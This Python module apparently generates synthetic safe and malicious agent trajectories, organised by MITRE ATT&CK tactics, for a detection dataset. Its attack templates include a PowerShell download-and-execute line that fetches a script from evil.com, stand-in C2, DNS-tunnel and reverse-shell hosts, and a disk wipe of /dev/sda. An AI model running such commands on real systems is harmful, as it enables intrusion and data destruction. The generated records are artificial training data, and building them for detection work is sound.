"""Enhanced trajectory generation for maximum diversity and robustness.

Improvements over base generator:
1. Full MITRE ATT&CK coverage (14 tactics)
2. Safe workflow composer (not just attacks)
3. Variable initial states
4. Edge cases: interrupted, failed, gray-area
5. Temporal patterns: multi-session, slow attacks
6. Balanced dataset generation with configurable ratios
"""

import json
import random
from typing import Any
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

from sandbox.env import base_initial_state, EnvState, NetworkConfig, UserContext


# =============================================================================
# EXPANDED MITRE ATT&CK TACTICS (14 total)
# =============================================================================

class Tactic(Enum):
    """All 14 MITRE ATT&CK Enterprise tactics."""
    RECONNAISSANCE = "reconnaissance"
    RESOURCE_DEVELOPMENT = "resource_development"
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"


# New tactics not in original composer
ADDITIONAL_TACTICS = {
    "initial_access": {
        "description": "How attackers get into the network",
        "techniques": [
            {
                "action": {"name": "PHISH_CLICK", "args": ["malicious_link.exe"]},
                "obs_templates": [
                    "User clicked phishing link in email",
                    "Malicious attachment executed by user",
                    "Drive-by download completed",
                ],
                "intent_templates": [
                    "gain initial foothold",
                    "establish access via phishing",
                    "execute initial payload",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "EXPLOIT_CVE", "args": ["CVE-2024-1234"]},
                "obs_templates": [
                    "Found vulnerable service version",
                    "Unpatched system detected",
                    "Exploitable vulnerability confirmed",
                ],
                "intent_templates": [
                    "exploit vulnerability for access",
                    "gain access via CVE",
                    "compromise vulnerable service",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "SUPPLY_CHAIN", "args": ["compromised_package"]},
                "obs_templates": [
                    "Malicious dependency installed",
                    "Compromised package in use",
                    "Supply chain attack successful",
                ],
                "intent_templates": [
                    "leverage supply chain compromise",
                    "execute via malicious dependency",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "execution": {
        "description": "Running malicious code",
        "techniques": [
            {
                "action": {"name": "RUN_SCRIPT", "args": ["malware.py"]},
                "obs_templates": [
                    "Executing payload script",
                    "Running malicious code",
                    "Script execution initiated",
                ],
                "intent_templates": [
                    "execute malicious payload",
                    "run attack script",
                    "launch malware",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "POWERSHELL", "args": ["IEX(wget http://evil.com/shell.ps1)"]},
                "obs_templates": [
                    "PowerShell execution available",
                    "Can run arbitrary commands",
                    "Shell access obtained",
                ],
                "intent_templates": [
                    "execute PowerShell payload",
                    "run encoded command",
                    "download and execute",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "SCHEDULED_TASK", "args": ["malicious_task"]},
                "obs_templates": [
                    "Can create scheduled tasks",
                    "Task scheduler accessible",
                ],
                "intent_templates": [
                    "schedule malicious execution",
                    "create persistent task",
                ],
                "flags": {"policy_violation": True, "persistence": True},
            },
        ],
    },
    "command_and_control": {
        "description": "Maintaining communication with compromised systems",
        "techniques": [
            {
                "action": {"name": "BEACON", "args": ["c2.attacker.com"]},
                "obs_templates": [
                    "Establishing C2 channel",
                    "Connecting to command server",
                    "Beacon connection initiated",
                ],
                "intent_templates": [
                    "establish C2 communication",
                    "connect to command server",
                    "start beacon callback",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "DNS_TUNNEL", "args": ["data.evil.com"]},
                "obs_templates": [
                    "Using DNS for covert channel",
                    "DNS tunneling available",
                ],
                "intent_templates": [
                    "exfiltrate via DNS",
                    "establish covert channel",
                ],
                "flags": {"exfil_attempt": True},
            },
            {
                "action": {"name": "REVERSE_SHELL", "args": ["attacker:4444"]},
                "obs_templates": [
                    "Opening reverse shell",
                    "Connecting back to attacker",
                ],
                "intent_templates": [
                    "establish reverse shell",
                    "get interactive access",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "impact": {
        "description": "Disrupting availability or integrity",
        "techniques": [
            {
                "action": {"name": "ENCRYPT_FILES", "args": ["/data/*"]},
                "obs_templates": [
                    "Deploying ransomware",
                    "Encrypting target files",
                    "Starting encryption routine",
                ],
                "intent_templates": [
                    "encrypt files for ransom",
                    "deploy ransomware payload",
                    "lock data for extortion",
                ],
                "flags": {"policy_violation": True, "log_tamper": True},
            },
            {
                "action": {"name": "WIPE_DISK", "args": ["/dev/sda"]},
                "obs_templates": [
                    "Initiating disk wipe",
                    "Destroying data",
                    "Executing wiper malware",
                ],
                "intent_templates": [
                    "destroy all data",
                    "wipe system disk",
                    "cause maximum damage",
                ],
                "flags": {"policy_violation": True, "log_tamper": True},
            },
            {
                "action": {"name": "DEFACE", "args": ["index.html"]},
                "obs_templates": [
                    "Modifying public website",
                    "Defacing web content",
                ],
                "intent_templates": [
                    "deface website",
                    "leave calling card",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "DOS", "args": ["target_service"]},
                "obs_templates": [
                    "Launching denial of service",
                    "Overwhelming target service",
                ],
                "intent_templates": [
                    "disrupt service availability",
                    "cause denial of service",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "discovery": {
        "description": "Learning about the environment (expanded)",
        "techniques": [
            {
                "action": {"name": "BLOODHOUND", "args": []},
                "obs_templates": [
                    "Running Active Directory enumeration",
                    "Mapping AD attack paths",
                    "Collecting AD relationships",
                ],
                "intent_templates": [
                    "map Active Directory",
                    "find privilege escalation paths",
                    "enumerate domain",
                ],
                "flags": {},
            },
            {
                "action": {"name": "CLOUD_ENUM", "args": ["aws"]},
                "obs_templates": [
                    "Enumerating cloud resources",
                    "Discovering cloud assets",
                    "Mapping cloud infrastructure",
                ],
                "intent_templates": [
                    "enumerate cloud resources",
                    "discover cloud assets",
                    "map cloud attack surface",
                ],
                "flags": {},
            },
            {
                "action": {"name": "CONTAINER_ENUM", "args": []},
                "obs_templates": [
                    "Enumerating containers",
                    "Discovering Kubernetes pods",
                    "Mapping container infrastructure",
                ],
                "intent_templates": [
                    "enumerate containers",
                    "find container escape vectors",
                    "map k8s cluster",
                ],
                "flags": {},
            },
        ],
    },
}


# =============================================================================
# SAFE WORKFLOW COMPOSER
# =============================================================================

SAFE_WORKFLOWS = {
    "incident_response": {
        "description": "Security team responding to an alert",
        "outcome": "safe",
        "agent_types": ["security", "soc_analyst"],
        "steps": [
            {
                "action": {"name": "READ_FILE", "args": ["/var/log/auth.log"]},
                "obs_templates": [
                    "Alert triggered for suspicious login",
                    "Investigating authentication anomaly",
                    "SIEM flagged unusual activity",
                ],
                "intent_templates": [
                    "review authentication logs",
                    "investigate alert source",
                    "check for unauthorized access",
                ],
                "flags": {},
            },
            {
                "action": {"name": "LIST_PROCESSES", "args": []},
                "obs_templates": [
                    "Checking for malicious processes",
                    "Reviewing running services",
                ],
                "intent_templates": [
                    "identify suspicious processes",
                    "check for malware",
                ],
                "flags": {},
            },
            {
                "action": {"name": "SCAN_NETWORK", "args": []},
                "obs_templates": [
                    "Scanning for lateral movement",
                    "Checking network connections",
                ],
                "intent_templates": [
                    "detect lateral movement",
                    "identify C2 connections",
                ],
                "flags": {},
            },
            {
                "action": {"name": "OPEN_TICKET", "args": []},
                "obs_templates": [
                    "Analysis complete, documenting findings",
                    "Creating incident report",
                ],
                "intent_templates": [
                    "document investigation",
                    "escalate if needed",
                ],
                "flags": {},
            },
        ],
    },
    "system_patching": {
        "description": "IT admin applying security patches",
        "outcome": "safe",
        "agent_types": ["sysadmin", "devops"],
        "steps": [
            {
                "action": {"name": "LIST_PROCESSES", "args": []},
                "obs_templates": [
                    "Checking running services before patch",
                    "Identifying services to restart",
                ],
                "intent_templates": [
                    "inventory running services",
                    "plan patch sequence",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/app/config.yaml"]},
                "obs_templates": [
                    "Reviewing configuration before update",
                    "Checking compatibility settings",
                ],
                "intent_templates": [
                    "backup configuration",
                    "verify settings",
                ],
                "flags": {},
            },
            {
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "obs_templates": [
                    "Running pre-patch health check",
                    "Verifying system stability",
                ],
                "intent_templates": [
                    "ensure system healthy",
                    "baseline performance",
                ],
                "flags": {},
            },
            {
                "action": {"name": "OPEN_TICKET", "args": []},
                "obs_templates": [
                    "Documenting patch application",
                    "Recording change for audit",
                ],
                "intent_templates": [
                    "document change",
                    "complete change request",
                ],
                "flags": {},
            },
        ],
    },
    "backup_verification": {
        "description": "Verifying backup integrity",
        "outcome": "safe",
        "agent_types": ["sysadmin", "dba"],
        "steps": [
            {
                "action": {"name": "READ_FILE", "args": ["/var/log/backup.log"]},
                "obs_templates": [
                    "Checking backup job status",
                    "Reviewing backup logs",
                ],
                "intent_templates": [
                    "verify backup completed",
                    "check for errors",
                ],
                "flags": {},
            },
            {
                "action": {"name": "QUERY_DB", "args": ["SELECT COUNT(*) FROM backup_status"]},
                "obs_templates": [
                    "Verifying database backup records",
                    "Checking backup metadata",
                ],
                "intent_templates": [
                    "confirm backup integrity",
                    "validate backup count",
                ],
                "flags": {},
            },
            {
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "obs_templates": [
                    "Running backup verification",
                    "Testing restore capability",
                ],
                "intent_templates": [
                    "verify restore works",
                    "test backup integrity",
                ],
                "flags": {},
            },
        ],
    },
    "compliance_audit": {
        "description": "Compliance check for regulatory requirements",
        "outcome": "safe",
        "agent_types": ["auditor", "compliance"],
        "steps": [
            {
                "action": {"name": "LIST_USERS", "args": []},
                "obs_templates": [
                    "Auditing user accounts",
                    "Reviewing access permissions",
                ],
                "intent_templates": [
                    "enumerate user accounts",
                    "check for orphaned accounts",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/passwd"]},
                "obs_templates": [
                    "Reviewing system accounts",
                    "Checking account configurations",
                ],
                "intent_templates": [
                    "audit system accounts",
                    "verify account policy",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/var/log/auth.log"]},
                "obs_templates": [
                    "Reviewing authentication audit trail",
                    "Checking login history",
                ],
                "intent_templates": [
                    "audit authentication logs",
                    "verify access logging",
                ],
                "flags": {},
            },
            {
                "action": {"name": "OPEN_TICKET", "args": []},
                "obs_templates": [
                    "Documenting audit findings",
                    "Creating compliance report",
                ],
                "intent_templates": [
                    "record audit results",
                    "submit compliance report",
                ],
                "flags": {},
            },
        ],
    },
    "performance_monitoring": {
        "description": "Monitoring system performance",
        "outcome": "safe",
        "agent_types": ["sre", "devops"],
        "steps": [
            {
                "action": {"name": "LIST_PROCESSES", "args": []},
                "obs_templates": [
                    "Checking CPU-intensive processes",
                    "Identifying resource hogs",
                ],
                "intent_templates": [
                    "find high-CPU processes",
                    "identify performance issues",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/logs/app.log"]},
                "obs_templates": [
                    "Checking application logs for errors",
                    "Reviewing error rates",
                ],
                "intent_templates": [
                    "identify application errors",
                    "check error patterns",
                ],
                "flags": {},
            },
            {
                "action": {"name": "SCAN_NETWORK", "args": []},
                "obs_templates": [
                    "Checking network latency",
                    "Monitoring connection health",
                ],
                "intent_templates": [
                    "verify network performance",
                    "check for bottlenecks",
                ],
                "flags": {},
            },
            {
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "obs_templates": [
                    "Running full system diagnostics",
                    "Generating performance report",
                ],
                "intent_templates": [
                    "complete health check",
                    "baseline system metrics",
                ],
                "flags": {},
            },
        ],
    },
    "database_maintenance": {
        "description": "Routine database maintenance",
        "outcome": "safe",
        "agent_types": ["dba"],
        "steps": [
            {
                "action": {"name": "QUERY_DB", "args": ["SELECT table_name FROM information_schema.tables"]},
                "obs_templates": [
                    "Reviewing database schema",
                    "Checking table statistics",
                ],
                "intent_templates": [
                    "inventory database tables",
                    "check table health",
                ],
                "flags": {},
            },
            {
                "action": {"name": "QUERY_DB", "args": ["ANALYZE TABLE users"]},
                "obs_templates": [
                    "Running table analysis",
                    "Updating query statistics",
                ],
                "intent_templates": [
                    "optimize query performance",
                    "update statistics",
                ],
                "flags": {},
            },
            {
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "obs_templates": [
                    "Checking database health",
                    "Verifying replication status",
                ],
                "intent_templates": [
                    "verify database health",
                    "check for issues",
                ],
                "flags": {},
            },
        ],
    },
}


# =============================================================================
# EDGE CASE GENERATORS
# =============================================================================

@dataclass
class EdgeCaseConfig:
    """Configuration for edge case generation."""
    interrupted_probability: float = 0.1      # Attack interrupted mid-way
    failed_probability: float = 0.1           # Attack fails (permission denied)
    almost_harmful_probability: float = 0.1   # Suspicious but ultimately safe
    multi_session_probability: float = 0.05   # Attack spans multiple sessions


def generate_interrupted_attack(base_trajectory: dict, interrupt_step: int) -> dict:
    """Generate an attack that gets interrupted (detected/blocked)."""
    trajectory = base_trajectory.copy()
    steps = trajectory["trajectory"][:interrupt_step]

    # Add detection/block step
    steps.append({
        "step_id": interrupt_step,
        "obs": random.choice([
            "Security alert triggered, access blocked",
            "IDS detected suspicious activity",
            "Account locked due to anomaly detection",
            "SOC analyst intervened",
            "Automated response blocked action",
        ]),
        "intent": "attack interrupted",
        "action": {"name": "BLOCKED", "args": []},
        "state_change": {"files": {}, "network": {}, "credentials": {}, "flags": {}},
    })

    trajectory["trajectory"] = steps
    trajectory["outcome"] = "interrupted"
    trajectory["notes"] = f"Attack interrupted at step {interrupt_step}"
    return trajectory


def generate_failed_attack(base_trajectory: dict, fail_step: int) -> dict:
    """Generate an attack where a step fails (permission denied, etc.)."""
    trajectory = base_trajectory.copy()
    steps = trajectory["trajectory"][:fail_step + 1]

    # Modify the failed step
    failed_step = steps[-1].copy()
    failed_step["obs"] = random.choice([
        "Permission denied - insufficient privileges",
        "Access blocked by security policy",
        "File not found or access restricted",
        "Network connection refused",
        "Authentication failed",
        "Resource temporarily unavailable",
    ])
    failed_step["state_change"]["flags"] = {}  # No flags set on failure
    steps[-1] = failed_step

    trajectory["trajectory"] = steps
    trajectory["outcome"] = "failed"
    trajectory["notes"] = f"Attack failed at step {fail_step}"
    return trajectory


def generate_almost_harmful(safe_workflow: dict) -> dict:
    """Generate a trajectory that looks suspicious but is actually safe."""
    trajectory = safe_workflow.copy()

    # Add suspicious-looking but legitimate actions
    suspicious_safe_actions = [
        {
            "action": {"name": "READ_FILE", "args": ["/etc/passwd"]},
            "obs": "Checking user accounts for audit",
            "intent": "verify user roster matches HR records",
            "flags": {},
        },
        {
            "action": {"name": "QUERY_DB", "args": ["SELECT username, email FROM users"]},
            "obs": "Generating user report for compliance",
            "intent": "create user inventory for audit",
            "flags": {},
        },
        {
            "action": {"name": "SCAN_NETWORK", "args": []},
            "obs": "Running authorized security scan",
            "intent": "verify network segmentation",
            "flags": {},
        },
    ]

    # Insert 1-2 suspicious-looking steps
    insert_count = random.randint(1, 2)
    for _ in range(insert_count):
        action = random.choice(suspicious_safe_actions)
        insert_pos = random.randint(1, len(trajectory["trajectory"]))
        trajectory["trajectory"].insert(insert_pos, {
            "step_id": insert_pos,
            "obs": action["obs"],
            "intent": action["intent"],
            "action": action["action"],
            "state_change": {"files": {}, "network": {}, "credentials": {}, "flags": {}},
        })

    # Renumber steps
    for i, step in enumerate(trajectory["trajectory"]):
        step["step_id"] = i

    trajectory["outcome"] = "safe"
    trajectory["notes"] = "Suspicious-looking but legitimate activity"
    return trajectory


# =============================================================================
# VARIABLE INITIAL STATES
# =============================================================================

INITIAL_STATE_VARIATIONS = [
    {
        "name": "standard_server",
        "files": {
            "/logs/app.log": "readable",
            "/etc/app/config.yaml": "readable",
            "/etc/shadow": "restricted",
            "/db/users.db": "sensitive",
            "/etc/passwd": "readable",
        },
        "network": {"ports": [22, 443, 8080], "outbound_allowed": False},
    },
    {
        "name": "cloud_instance",
        "files": {
            "/home/ubuntu/.aws/credentials": "sensitive",
            "/var/log/cloud-init.log": "readable",
            "/etc/kubernetes/admin.conf": "restricted",
            "/app/.env": "sensitive",
            "/.dockerenv": "readable",
        },
        "network": {"ports": [22, 443, 6443], "outbound_allowed": True},
    },
    {
        "name": "database_server",
        "files": {
            "/var/lib/mysql/data/": "sensitive",
            "/etc/mysql/my.cnf": "readable",
            "/var/log/mysql/error.log": "readable",
            "/root/.mysql_history": "restricted",
        },
        "network": {"ports": [22, 3306], "outbound_allowed": False},
    },
    {
        "name": "web_server",
        "files": {
            "/var/www/html/": "readable",
            "/etc/nginx/nginx.conf": "readable",
            "/var/log/nginx/access.log": "readable",
            "/etc/letsencrypt/": "restricted",
            "/app/config/secrets.yaml": "sensitive",
        },
        "network": {"ports": [22, 80, 443], "outbound_allowed": True},
    },
    {
        "name": "developer_workstation",
        "files": {
            "/home/dev/.ssh/id_rsa": "sensitive",
            "/home/dev/.gitconfig": "readable",
            "/home/dev/projects/": "readable",
            "/home/dev/.bash_history": "sensitive",
            "/home/dev/.aws/credentials": "sensitive",
        },
        "network": {"ports": [22], "outbound_allowed": True},
    },
    {
        "name": "ci_cd_runner",
        "files": {
            "/home/runner/.docker/config.json": "sensitive",
            "/var/run/docker.sock": "restricted",
            "/etc/gitlab-runner/config.toml": "readable",
            "/builds/": "readable",
        },
        "network": {"ports": [22, 8080], "outbound_allowed": True},
    },
]


def get_variable_initial_state(agent_type: str, variation: str = None) -> dict:
    """Get an initial state with variation."""
    if variation:
        var = next((v for v in INITIAL_STATE_VARIATIONS if v["name"] == variation), None)
    else:
        var = random.choice(INITIAL_STATE_VARIATIONS)

    if not var:
        var = INITIAL_STATE_VARIATIONS[0]

    privilege = "medium" if agent_type in ["insider", "admin", "sysadmin"] else "low"

    return {
        "files": var["files"],
        "network": var["network"],
        "credentials": {"admin_token": None, "db_password": None, "api_key": None},
        "user_context": {"role": agent_type, "privilege_level": privilege},
    }


# =============================================================================
# EXPANDED CONTEXTS AND PERSONAS
# =============================================================================

EXPANDED_CONTEXTS = [
    # Original contexts
    "A financial services company's trading platform",
    "A healthcare provider's patient records system",
    "An e-commerce platform during holiday sales",
    "A government agency's citizen services portal",
    "A startup's cloud infrastructure on AWS",
    "A university's research computing cluster",
    "A manufacturing company's IoT control system",
    "A media company's content delivery network",
    "A law firm's document management system",
    "A retail chain's point-of-sale network",
    # New contexts
    "A cryptocurrency exchange's hot wallet system",
    "A pharmaceutical company's research database",
    "An airline's reservation and ticketing system",
    "A telecom provider's customer billing platform",
    "A defense contractor's classified network",
    "A hospital's medical device network",
    "An energy utility's SCADA control system",
    "A social media platform's user data store",
    "A gaming company's player account system",
    "An insurance company's claims processing",
    "A logistics company's fleet tracking system",
    "A real estate firm's transaction database",
    "A sports betting platform's odds engine",
    "A streaming service's content delivery",
    "A cloud provider's customer management",
    "An automotive manufacturer's supply chain",
    "A food delivery platform's dispatch system",
    "A ride-sharing service's driver network",
    "A dating app's user matching algorithm",
    "A news organization's editorial system",
]

EXPANDED_ATTACKER_PERSONAS = [
    # Original personas
    "A disgruntled employee with system admin access",
    "An external contractor with limited access",
    "An automated bot that's been compromised",
    "A nation-state actor with sophisticated tools",
    "A ransomware operator looking for quick profit",
    "An insider doing corporate espionage",
    "A hacktivist with ideological motivation",
    "A former employee whose credentials weren't revoked",
    # New personas
    "A curious intern exploring beyond their scope",
    "A compromised third-party vendor",
    "A malicious AI agent that's been jailbroken",
    "A sophisticated APT group conducting reconnaissance",
    "A financially motivated cybercriminal",
    "A competitor's hired penetration tester",
    "An activist targeting the organization's practices",
    "A rogue IT administrator covering their tracks",
    "A social engineer with stolen credentials",
    "A supply chain attacker via compromised software",
    "An opportunistic attacker exploiting a zero-day",
    "A state-sponsored actor seeking IP theft",
]

EXPANDED_SAFE_PERSONAS = [
    # Original personas
    "A security analyst performing routine audit",
    "A DevOps engineer deploying updates",
    "A support technician troubleshooting issues",
    "A database administrator doing maintenance",
    "An incident responder investigating an alert",
    "A compliance officer checking configurations",
    # New personas
    "A penetration tester with authorization",
    "A site reliability engineer on-call",
    "A backup operator verifying jobs",
    "A network engineer troubleshooting latency",
    "A software developer debugging production",
    "A security architect reviewing configs",
    "An auditor performing annual review",
    "A help desk agent assisting a user",
    "A data analyst running reports",
    "A release manager deploying updates",
]


# =============================================================================
# BALANCED DATASET GENERATOR
# =============================================================================

@dataclass
class DatasetConfig:
    """Configuration for balanced dataset generation."""
    total_episodes: int = 10000

    # Outcome ratios (should sum to 1.0)
    safe_ratio: float = 0.45
    harmful_ratio: float = 0.40
    drift_ratio: float = 0.10
    edge_case_ratio: float = 0.05  # interrupted, failed, almost-harmful

    # Generation method ratios for each outcome type
    use_llm: bool = False
    use_composer: bool = True
    use_templates: bool = True

    # Edge case breakdown
    interrupted_ratio: float = 0.4
    failed_ratio: float = 0.3
    almost_harmful_ratio: float = 0.3


def generate_safe_trajectory(config: DatasetConfig, episode_id: str) -> dict:
    """Generate a safe workflow trajectory."""
    workflow_name = random.choice(list(SAFE_WORKFLOWS.keys()))
    workflow = SAFE_WORKFLOWS[workflow_name]

    agent_type = random.choice(workflow["agent_types"])
    context = random.choice(EXPANDED_CONTEXTS)
    initial_state = get_variable_initial_state(agent_type)

    steps = []
    for i, step_template in enumerate(workflow["steps"]):
        steps.append({
            "step_id": i,
            "obs": random.choice(step_template["obs_templates"]),
            "intent": random.choice(step_template["intent_templates"]),
            "action": step_template["action"],
            "state_change": {
                "files": {},
                "network": {},
                "credentials": {},
                "flags": step_template["flags"],
            },
        })

    return {
        "episode_id": episode_id,
        "agent_type": agent_type,
        "initial_state": initial_state,
        "trajectory": steps,
        "outcome": "safe",
        "notes": f"Safe {workflow_name} workflow in {context}",
    }


def generate_balanced_dataset(
    output_path: str,
    config: DatasetConfig = None,
    resume: bool = True,
) -> dict:
    """Generate a balanced dataset with configurable ratios."""
    from dataset.composer import compose_trajectory, ATTACK_CHAINS
    from dataset.generator import sample_template, mutate_trajectory

    if config is None:
        config = DatasetConfig()

    stats = {
        "total": 0,
        "safe": 0,
        "harmful": 0,
        "drift": 0,
        "edge_cases": {"interrupted": 0, "failed": 0, "almost_harmful": 0},
    }

    # Calculate counts for each type
    safe_count = int(config.total_episodes * config.safe_ratio)
    harmful_count = int(config.total_episodes * config.harmful_ratio)
    drift_count = int(config.total_episodes * config.drift_ratio)
    edge_count = config.total_episodes - safe_count - harmful_count - drift_count

    # Check for existing progress
    start_idx = 0
    output_file = Path(output_path)

    if resume and output_file.exists():
        with open(output_path, "r") as f:
            start_idx = sum(1 for _ in f)
        if start_idx > 0:
            print(f"Resuming from {start_idx:,} episodes")

    mode = "a" if (resume and start_idx > 0) else "w"

    chain_names = list(ATTACK_CHAINS.keys())

    with open(output_path, mode) as f:
        for i in range(start_idx, config.total_episodes):
            episode_id = f"balanced_{i:06d}"

            # Determine episode type based on ratios
            r = random.random()

            if r < config.safe_ratio:
                # Generate safe trajectory
                episode = generate_safe_trajectory(config, episode_id)
                stats["safe"] += 1

            elif r < config.safe_ratio + config.harmful_ratio:
                # Generate harmful trajectory
                chain_name = random.choice(chain_names)
                episode = compose_trajectory(chain_name, episode_id)
                stats["harmful"] += 1

            elif r < config.safe_ratio + config.harmful_ratio + config.drift_ratio:
                # Generate drift trajectory (safe start, risky end)
                template = sample_template()
                while template["outcome"] != "drift":
                    template = sample_template()
                episode = mutate_trajectory(template, episode_id)
                stats["drift"] += 1

            else:
                # Generate edge case
                edge_r = random.random()
                base_chain = random.choice(chain_names)
                base_episode = compose_trajectory(base_chain, episode_id)

                if edge_r < config.interrupted_ratio:
                    interrupt_step = random.randint(1, len(base_episode["trajectory"]) - 1)
                    episode = generate_interrupted_attack(base_episode, interrupt_step)
                    stats["edge_cases"]["interrupted"] += 1
                elif edge_r < config.interrupted_ratio + config.failed_ratio:
                    fail_step = random.randint(0, len(base_episode["trajectory"]) - 1)
                    episode = generate_failed_attack(base_episode, fail_step)
                    stats["edge_cases"]["failed"] += 1
                else:
                    safe_base = generate_safe_trajectory(config, episode_id)
                    episode = generate_almost_harmful(safe_base)
                    stats["edge_cases"]["almost_harmful"] += 1

            f.write(json.dumps(episode) + "\n")
            stats["total"] += 1

            if (i + 1) % 1000 == 0:
                print(f"Generated {i + 1:,}/{config.total_episodes:,} episodes")

    print(f"\nDataset generation complete:")
    print(f"  Total: {stats['total']:,}")
    print(f"  Safe: {stats['safe']:,} ({stats['safe']/stats['total']*100:.1f}%)")
    print(f"  Harmful: {stats['harmful']:,} ({stats['harmful']/stats['total']*100:.1f}%)")
    print(f"  Drift: {stats['drift']:,} ({stats['drift']/stats['total']*100:.1f}%)")
    print(f"  Edge cases: {sum(stats['edge_cases'].values()):,}")

    return stats


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Enhanced trajectory generation")
    parser.add_argument("--episodes", type=int, default=10000)
    parser.add_argument("--output", type=str, default="data/enhanced_trajectories.jsonl")
    parser.add_argument("--safe-ratio", type=float, default=0.45)
    parser.add_argument("--harmful-ratio", type=float, default=0.40)
    parser.add_argument("--fresh", action="store_true")

    args = parser.parse_args()

    config = DatasetConfig(
        total_episodes=args.episodes,
        safe_ratio=args.safe_ratio,
        harmful_ratio=args.harmful_ratio,
    )

    generate_balanced_dataset(args.output, config, resume=not args.fresh)
